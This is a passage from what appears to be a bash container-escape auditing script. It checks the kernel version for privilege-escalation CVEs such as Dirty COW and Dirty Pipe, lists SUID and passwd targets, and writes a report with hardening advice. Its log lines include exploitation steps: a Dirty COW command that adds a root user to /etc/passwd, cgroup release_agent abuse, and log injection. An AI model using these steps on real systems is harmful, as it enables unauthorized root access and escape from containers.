MinorRevision=`echo -e $LinuxKernelVersion | awk -F '.' '{print $3}'`

CheckCVE_2016_5195DirtyCow(){
    log_info "=== CVE-2016-5195 (DIRTY COW) ANALYSIS ==="
    
    vulnerable=0
    
    # 2.6.22 <= ver <= 4.8.3
    if [[ "$KernelVersion" -eq 2 && "$MajorRevision" -eq 6 && "$MinorRevision" -ge 22 ]] || \
       [[ "$KernelVersion" -eq 2 && "$MajorRevision" -ge 7 ]] || \
       [[ "$KernelVersion" -eq 3 ]] || \
       [[ "$KernelVersion" -eq 4 && "$MajorRevision" -lt 8 ]] || \
       [[ "$KernelVersion" -eq 4 && "$MajorRevision" -eq 8 && "$MinorRevision" -le 3 ]]; then
        vulnerable=1
    fi
    
    if [ $vulnerable -eq 1 ]; then
        log_vuln "CVE-2016-5195 (Dirty COW) vulnerability detected!"
        
        echo "=== CVE-2016-5195 Analysis ===" > "$RECONNAISSANCE_DIR/cve_2016_5195.txt"
        {
            echo "Kernel Version: $LinuxKernelVersion"
            echo "Vulnerability: Race condition in mm/gup.c"
            echo "Impact: Local privilege escalation"
            echo "CVSS Score: 7.8"
            
            echo -e "\n--- Exploitation Methods ---"
            echo "1. Modify /etc/passwd to add root user"
            echo "2. Overwrite SUID binaries"
            echo "3. Modify system configuration files"
            
            echo -e "\n--- Available Targets ---"
            ls -la /etc/passwd /etc/shadow /usr/bin/passwd 2>/dev/null || echo "Standard targets not found"
        } >> "$RECONNAISSANCE_DIR/cve_2016_5195.txt"
        
        log_exploit "Dirty COW exploitation:"
        log_exploit "1. Compile dirty cow exploit"
        log_exploit "2. Target: echo 'root2:x:0:0::/root:/bin/bash' | ./dirtycow /etc/passwd"
        log_exploit "3. Or target SUID binary: ./dirtycow /usr/bin/passwd"
    else
        log_info "Not vulnerable to CVE-2016-5195 (Dirty COW)"
    fi
}

CheckCVE_2020_14386(){
    log_info "=== CVE-2020-14386 ANALYSIS ==="
    
    vulnerable=0
    
    # 4.6 <= ver < 5.9
    if [[ "$KernelVersion" -eq 4 && "$MajorRevision" -ge 6 ]] || \
       [[ $KernelVersion -eq 5 && $MajorRevision -lt 9 ]]; then
        vulnerable=1
    fi
    
    if [ $vulnerable -eq 1 ]; then
        log_vuln "CVE-2020-14386 vulnerability detected!"
        
        echo "=== CVE-2020-14386 Analysis ===" > "$RECONNAISSANCE_DIR/cve_2020_14386.txt"
        {
            echo "Kernel Version: $LinuxKernelVersion"
            echo "Vulnerability: AF_PACKET socket memory corruption"
            echo "Impact: Local privilege escalation"
            echo "CVSS Score: 7.8"
            
            echo -e "\n--- Requirements ---"
            echo "- Unprivileged user namespaces enabled"
            echo "- AF_PACKET socket support"
            
            echo -e "\n--- Verification ---"
            echo "User namespaces: $(cat /proc/sys/user/max_user_namespaces 2>/dev/null || echo 'unknown')"
            echo "AF_PACKET support: $(grep AF_PACKET /proc/net/protocols 2>/dev/null || echo 'unknown')"
        } >> "$RECONNAISSANCE_DIR/cve_2020_14386.txt"
        
        log_exploit "CVE-2020-14386 exploitation requires specific exploit code"
        log_exploit "Search for CVE-2020-14386 PoC exploits"
    else
        log_info "Not vulnerable to CVE-2020-14386"
    fi
}

CheckCVE_2022_0847(){
    log_info "=== CVE-2022-0847 (DIRTY PIPE) ANALYSIS ==="
    
    vulnerable=0
    
    if [ $KernelVersion -eq 5 ]; then
        if [[ "$MajorRevision" -ge 8 && "$MajorRevision" -lt 10 ]] || \
           [[ "$MajorRevision" -eq 10 && "$MinorRevision" -lt 102 ]] || \
           [[ "$MajorRevision" -eq 10 && "$MinorRevision" -gt 102 ]] || \
           [[ "$MajorRevision" -gt 10 && "$MajorRevision" -lt 15 ]] || \
           [[ "$MajorRevision" -eq 15 && "$MinorRevision" -lt 25 ]] || \
           [[ "$MajorRevision" -eq 15 && "$MinorRevision" -gt 25 ]] || \
           [[ "$MajorRevision" -eq 16 && "$MinorRevision" -lt 11 ]]; then
            vulnerable=1
        fi
    fi
    
    if [ $vulnerable -eq 1 ]; then
        log_vuln "CVE-2022-0847 (Dirty Pipe) vulnerability detected!"
        
        echo "=== CVE-2022-0847 Analysis ===" > "$RECONNAISSANCE_DIR/cve_2022_0847.txt"
        {
            echo "Kernel Version: $LinuxKernelVersion"
            echo "Vulnerability: Pipe buffer overwrite vulnerability"
            echo "Impact: Local privilege escalation"
            echo "CVSS Score: 7.8"
            
            echo -e "\n--- Target Files ---"
            echo "Potential targets for overwrite:"
            find /usr -perm -4000 2>/dev/null | head -10
            find /bin -perm -4000 2>/dev/null | head -10
        } >> "$RECONNAISSANCE_DIR/cve_2022_0847.txt"
        
        log_exploit "Dirty Pipe exploitation:"
        log_exploit "1. Find SUID binary or important file"
        log_exploit "2. Use pipe buffer overwrite to modify content"
        log_exploit "3. Common targets: /etc/passwd, SUID binaries"
    else
        log_info "Not vulnerable to CVE-2022-0847 (Dirty Pipe)"
    fi
}

CheckCVE_2017_1000112(){
    log_info "=== CVE-2017-1000112 ANALYSIS ==="
    
    vulnerable=0
    
    # 4.4 <= ver <= 4.13
    if [[ "$KernelVersion" -eq 4 && "$MajorRevision" -ge 4 && "$MajorRevision" -le 13 ]]; then
        vulnerable=1
    fi
    
    if [ $vulnerable -eq 1 ]; then
        log_vuln "CVE-2017-1000112 vulnerability detected!"
        log_exploit "Requires exploit code - search for CVE-2017-1000112 PoC"
    else
        log_info "Not vulnerable to CVE-2017-1000112"
    fi
}

CheckCVE_2021_22555(){
    log_info "=== CVE-2021-22555 ANALYSIS ==="
    
    vulnerable=0
    
    # 2.6.19 <= ver <= 5.12
    if [[ "$KernelVersion" -eq 2 && "$MajorRevision" -eq 6 && "$MinorRevision" -ge 19 ]] || \
       [[ "$KernelVersion" -eq 2 && "$MajorRevision" -ge 7 ]] || \
       [[ "$KernelVersion" -eq 3 || "$KernelVersion" -eq 4 ]] || \
       [[ $KernelVersion -eq 5 && $MajorRevision -le 12 ]]; then
        vulnerable=1
    fi
    
    if [ $vulnerable -eq 1 ]; then
        log_vuln "CVE-2021-22555 vulnerability detected!"
        log_exploit "Netfilter heap out-of-bounds write - requires exploit code"
    else
        log_info "Not vulnerable to CVE-2021-22555"
    fi
}

CheckCVE_2022_0492(){
    log_info "=== CVE-2022-0492 ANALYSIS ==="
    
    test_dir=/tmp/.cve-2022-0492-test
    vulnerable=0
    
    if mkdir -p $test_dir 2>/dev/null; then
        while read -r subsys; do
            if unshare -UrmC --propagation=unchanged bash -c "mount -t cgroup -o $subsys cgroup $test_dir 2>&1 >/dev/null && test -w $test_dir/release_agent" >/dev/null 2>&1; then
                log_vuln "CVE-2022-0492 vulnerability detected!"
                vulnerable=1
                
                log_exploit "CVE-2022-0492 exploitation:"
                log_exploit "1. Create user namespace with cgroup mount"
                log_exploit "2. Write to release_agent to execute commands as root"
                log_exploit "3. unshare -UrmC --propagation=unchanged"
                break
            fi
        done <<< $(cat /proc/$$/cgroup | grep -Eo '[0-9]+:[^:]+' | grep -Eo '[^:]+$' 2>/dev/null)
        
        umount $test_dir >/dev/null 2>&1 && rm -rf $test_dir >/dev/null 2>&1
    fi
    
    if [ $vulnerable -eq 0 ]; then
        log_info "Not vulnerable to CVE-2022-0492"
    fi
}

# Enhanced Mount Analysis
CheckVarLogMount(){
    log_info "=== HOST /var/log MOUNT ANALYSIS ==="
    
    IsPodEnv=0
    if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
        IsPodEnv=1
    fi
    
    if [ $IsPodEnv -eq 1 ]; then
        LASTLOG_COUNT=$(find / -name lastlog 2>/dev/null | wc -l)
        if [ "$LASTLOG_COUNT" -ge 3 ]; then
            log_vuln "Host /var/log appears to be mounted (found $LASTLOG_COUNT lastlog files)"
            
            echo "=== /var/log Mount Analysis ===" > "$RECONNAISSANCE_DIR/varlog_analysis.txt"
            {
                echo "--- Log Files Found ---"
                find /var/log -type f 2>/dev/null | head -20
                
                echo -e "\n--- Writable Log Files ---"
                find /var/log -type f -writable 2>/dev/null | head -10
                
                echo -e "\n--- Recent Log Entries ---"
                for log in auth.log secure messages syslog; do
                    if [ -f "/var/log/$log" ]; then
                        echo "=== /var/log/$log ==="
                        tail -5 "/var/log/$log" 2>/dev/null
                        echo ""
                    fi
                done
            } >> "$RECONNAISSANCE_DIR/varlog_analysis.txt"
            
            log_exploit "Host log exploitation:"
            log_exploit "1. Monitor host activity: tail -f /var/log/auth.log"
            log_exploit "2. Inject log entries for social engineering"
            log_exploit "3. Modify log rotation configuration"
        else
            log_info "Host /var/log not mounted (normal Kubernetes pod)"
        fi
    else
        log_info "Not in Kubernetes environment"
    fi
}

# Generate comprehensive report
GenerateReport() {
    log_info "=== GENERATING COMPREHENSIVE REPORT ==="
    
    REPORT_FILE="$RECONNAISSANCE_DIR/container_escape_report.txt"
    RESULTS_REPORT_FILE="$RESULTS_DIR/container_escape_report.txt"
    
    {
        echo "========================================================"
        echo "         CONTAINER ESCAPE VULNERABILITY REPORT"
        echo "========================================================"
        echo "Generated: $(date)"
        echo "Hostname: $(hostname)"
        echo "Kernel: $(uname -r)"
        echo "Container Type: ${ContainerType:-Unknown}"
        echo ""
        
        echo "=== EXECUTIVE SUMMARY ==="
        if [ $VulnerabilityExists -eq 1 ]; then
            echo "❌ VULNERABILITIES FOUND - Container escape may be possible"
        else
            echo "✅ NO MAJOR VULNERABILITIES DETECTED"
        fi
        echo ""
        
        echo "=== DETAILED FINDINGS ==="
        cat "$LOG_FILE" 2>/dev/null | grep -E "\[+\]|\[EXPLOIT\]" || echo "No major findings"
        echo ""
        
        echo "=== RECOMMENDATIONS ==="
        echo "1. Remove unnecessary capabilities"
        echo "2. Avoid privileged mode unless absolutely required"
        echo "3. Never mount Docker socket into containers"
        echo "4. Use read-only root filesystem when possible"
        echo "5. Apply security contexts and pod security policies"
        echo "6. Keep kernel and container runtime updated"
        echo "7. Use AppArmor/SELinux profiles"
        echo "8. Implement proper network segmentation"
        echo ""
        
        echo "=== FILES GENERATED ==="
        ls -la "$RECONNAISSANCE_DIR/"
        echo ""
        
        echo "=== FULL LOG ==="
        cat "$LOG_FILE" 2>/dev/null || echo "No log available"
        
    } > "$REPORT_FILE"
    
    # Also save to results directory for web server
    cp "$REPORT_FILE" "$RESULTS_REPORT_FILE" 2>/dev/null
    
    # Copy all reconnaissance files to results directory
    log_info "Copying all analysis files to results directory..."
    cp -r "$RECONNAISSANCE_DIR"/* "$RESULTS_DIR/" 2>/dev/null || true
    
    # Create a summary file for the web interface
    {
        echo "Container Escape Check Results Summary"
        echo "======================================"
        echo "Generated: $(date)"
        echo "Vulnerability Status: $([ $VulnerabilityExists -eq 1 ] && echo 'VULNERABILITIES FOUND' || echo 'NO MAJOR VULNERABILITIES')"
        echo "Container Type: ${ContainerType:-Unknown}"
        echo "Kernel: $(uname -r)"
        echo ""
        echo "Files Generated:"
        ls -la "$RESULTS_DIR/" 2>/dev/null | grep -v "^total" || echo "No files"
    } > "$RESULTS_DIR/summary.txt"
    
    log_info "Comprehensive report saved to: $REPORT_FILE"
    log_info "Results copied to: $RESULTS_DIR/"
}

# Main execution function
main() {
    log_info "Starting Advanced Container Escape Reconnaissance..."
    
    # Core system checks
    CheckTheCurrentEnvironment
    GatherSystemInfo
    NetworkReconnaissance
    ProcessAnalysis
    FileSystemReconnaissance
    
    # Comprehensive capability analysis
    ComprehensiveCapabilityAnalysis
    
    # Security checks
    CheckPrivilegedMode
    CheckDockerSocketMount
    CheckProcfsMount
    CheckRootDirectoryMount
    CheckDockerRemoteAPI
    CheckVarLogMount
    
    # CVE checks
    CheckCVE_2016_5195DirtyCow
    CheckCVE_2020_14386
    CheckCVE_2022_0847
    CheckCVE_2017_1000112
    CheckCVE_2021_22555
    CheckCVE_2022_0492
    
    # Generate final report
    GenerateReport
    
    if [ $VulnerabilityExists -eq 0 ]; then
        log_info "✅ Reconnaissance completed - No major vulnerabilities found"
    else
        log_warn "⚠️  Reconnaissance completed - VULNERABILITIES DETECTED!"
        log_info "📋 Check detailed report: $RECONNAISSANCE_DIR/container_escape_report.txt"
    fi
    
    log_info "🔍 All reconnaissance data saved in: $RECONNAISSANCE_DIR/"
}

# Execute main function
main